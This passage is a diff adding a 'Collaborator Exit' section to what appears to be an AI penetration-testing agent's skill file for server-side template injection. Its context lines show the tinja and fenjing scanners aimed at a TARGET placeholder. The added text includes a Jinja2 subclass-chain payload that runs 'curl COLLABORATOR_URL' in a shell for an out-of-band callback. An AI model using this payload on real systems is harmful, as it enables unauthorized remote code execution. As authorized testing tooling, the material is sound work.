@@ -471,3 +471,22 @@ tinja url -u "https://TARGET/page?name=test"
 # Fenjing — Jinja2 filter bypass specialist (CTF-focused)
 python -m fenjing crack --url 'https://TARGET/' --method GET --inputs name
 ```
+
+## Collaborator Exit (Burp co-pilot path)
+
+If `engagement/state.md` contains `burp-copilot: active` AND you reach a blind
+SSTI testing point that requires OOB callbacks (template output not reflected),
+return to the orchestrator with:
+
+**Routing Recommendations:**
+- OOB needed: blind SSTI at [endpoint]/[parameter]
+- Payload template: [SSTI payload with COLLABORATOR_URL placeholder — e.g., `{{''.__class__.__mro__[1].__subclasses__()[N]('curl COLLABORATOR_URL',shell=True)}}`]
+- Interaction type: dns|http
+- Context: [what a callback confirms — e.g., "Jinja2 code execution confirmed via OOB DNS", "template engine evaluates expressions but output is suppressed"]
+
+The orchestrator handles Collaborator payload generation and interaction
+polling in the main context, then re-invokes this skill with results.
+
+If `burp-copilot` is NOT active, use existing fallbacks (time-based via
+`time.sleep()`, error-based via deliberate exceptions, boolean-based via
+conditional output).
